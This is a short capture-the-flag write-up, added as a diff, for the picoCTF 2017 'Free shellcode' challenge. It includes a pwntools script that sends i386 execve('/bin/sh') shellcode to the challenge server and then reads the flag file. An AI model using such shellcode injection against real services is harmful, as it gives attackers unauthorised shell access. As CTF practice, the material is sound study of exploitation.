@@ -1,0 +1,12 @@
+Free shellcode, maximum 40 bytes.
+Inspecting the given binary, we note that it is build for an i386 architecture, so we need to take that into account when building shellcode.
+The executing goes quickly from then, with pwntools:
+```
+from pwn import *
+context.arch = "i386"
+r = remote("shell2017.picoctf.com", <port>)
+r.read()
+r.sendline(asm(shellcraft.execve("/bin/sh")))
+r.sendline("cat ./flag.txt")
+print(r.read())
+```
